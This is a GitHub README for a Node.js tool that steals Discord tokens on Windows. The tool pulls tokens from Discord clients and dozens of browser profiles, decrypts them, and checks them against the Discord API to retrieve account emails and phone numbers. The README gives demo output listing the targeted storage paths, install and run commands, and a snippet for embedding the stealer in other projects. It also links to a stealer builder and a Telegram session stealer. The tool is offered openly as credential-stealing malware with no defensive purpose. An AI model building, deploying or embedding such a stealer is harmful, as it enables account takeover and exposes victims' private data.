# Discord Stealer

Steal Discord tokens from clients and browsers.

**Check [Waifu Stealer](https://github.com/rigwild/waifu-stealer) (Stealer builder: Discord, Telegram, Browsers, ...)**

**Note:** This only works on Windows.

## Features

- Steal Discord tokens from clients and decrypt them
- Steal Discord tokens from browsers (every profiles)
- Check token validity and get user information

## Demo

```
Look in Discord Client - C:\Users\x\AppData\Roaming\discord\Local Storage\leveldb
  Found token NDExMTxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Skip Discord Canary Client (not found) - C:\Users\x\AppData\Roaming\discordcanary\Local Storage\leveldb
Skip Discord PTB Client (not found) - C:\Users\x\AppData\Roaming\discordptb\Local Storage\leveldb
Skip Opera (not found) - C:\Users\x\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb
Skip Opera GX (not found) - C:\Users\x\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb
Skip Amigo (not found) - C:\Users\x\AppData\Local\Amigo\User Data\Local Storage\leveldb
Skip Torch (not found) - C:\Users\x\AppData\Local\Torch\User Data\Local Storage\leveldb
Skip Kometa (not found) - C:\Users\x\AppData\Local\Kometa\User Data\Local Storage\leveldb
Skip Orbitum (not found) - C:\Users\x\AppData\Local\Orbitum\User Data\Local Storage\leveldb
Skip CentBrowser (not found) - C:\Users\x\AppData\Local\CentBrowser\User Data\Local Storage\leveldb
Skip 7Star (not found) - C:\Users\x\AppData\Local\7Star\7Star\User Data\Local Storage\leveldb
Skip Sputnik (not found) - C:\Users\x\AppData\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb
Skip Vivaldi (not found) - C:\Users\x\AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb
Skip Chrome SxS (not found) - C:\Users\x\AppData\Local\Google\Chrome SxS\User Data\Local Storage\leveldb
Skip Chrome (not found) - C:\Users\x\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb
Skip Epic Privacy Browser (not found) - C:\Users\x\AppData\Local\Epic Privacy Browser\User Data\Local Storage\leveldb
Look in Firefox - C:\Users\x\AppData\Roaming\Mozilla\Firefox\Profiles
  Found token NDMxNzxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
  Found token NDMxNzxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Skip Iridium (not found) - C:\Users\Admin\AppData\Local\Iridium
Look in Microsoft Edge - C:\Users\x\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb
Skip Uran (not found) - C:\Users\x\AppData\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb
Skip Yandex (not found) - C:\Users\x\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb
Look in Brave - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb
Skip Iridium (not found) - C:\Users\x\AppData\Local\Iridium\User Data\Default\Local Storage\leveldb
Look in Ungoogled Chromium - C:\Users\x\AppData\Local\Chromium\User Data\Default\Local Storage\leveldb
Look in Brave Profile 3 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 3\Local Storage\leveldb
Look in Brave Profile 5 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 5\Local Storage\leveldb
  Found token NDMxNzxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
  Found token NDExMTxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Look in Brave Profile 7 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 7\Local Storage\leveldb
Look in Brave Profile 8 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 8\Local Storage\leveldb
Look in Brave Profile 9 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 9\Local Storage\leveldb
  Found token OTUzMzxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Look in Brave Profile 11 - C:\Users\x\AppData\Local\BraveSoftware\Brave-Browser\User Data\Profile 11\Local Storage\leveldb

Check Discord tokens using the API
  Checking token NDExMTxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    Found user hello#1234 (id=123456789123456789, email=xxxxxx@gmail.com, phone=+4166123456)
  Checking token NDMxNzxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    Found user qwerty#9876 (id=223456789123456789, email=yyyyyyy@gmail.com, phone=+6287129539302)
  Checking token NDExMTxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    Token is invalid or expired
  Checking token NDExMTxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    Found user xdxdxd#4567 (id=323456789123456789, email=zzzzzz@gmail.com, phone=null)
```

## Prerequisites

- Node.js
- Visual C++ Build Tools (using a recent Node.js installer can set it up for you!)

## Usage

```sh
git clone https://github.com/rigwild/discord-stealer.git
cd discord-stealer
npm i -D
npm start
```

## Include in your project

```sh
npm install https://github.com/rigwild/discord-stealer.git
```

```ts
import { run as stealDiscord } from 'discord-stealer'

type DiscordUser = {
  id: string
  username: string
  discriminator: string
  avatar: string
  bot: boolean | null
  system: boolean | null
  mfa_enabled: boolean | null
  banner: string | null
  accent_color: number | null
  locale: string | null
  verified: boolean | null
  email: string | null
  flags: number | null
  premium_type: number | null
  public_flags: number | null
}

type StealDiscord = () => Promise<{ [token: string]: DiscordUser }>

const data = await stealDiscord()
/* =>
{
  'token1': {
    id: 'xxxx',
    username: 'hello',
    avatar: 'xxxxxx',
    avatar_decoration: null,
    discriminator: '1234',
    public_flags: 0,
    flags: 32,
    banner: null,
    banner_color: null,
    accent_color: null,
    bio: '',
    locale: 'en-US',
    nsfw_allowed: true,
    mfa_enabled: true,
    email: 'xxxx@gmail.com',
    verified: true,
    phone: '+1234567890'
  },
  'token2': {
    [...]
  }
}
*/
```

## Related projects

- [Waifu Stealer](https://github.com/rigwild/waifu-stealer) - Stealer builder (Browsers, Discord, Telegram, ...)
- [Telegram Stealer](https://github.com/rigwild/telegram-stealer) - Steal Telegram Desktop sessions

## License

[The MIT license](./LICENSE)
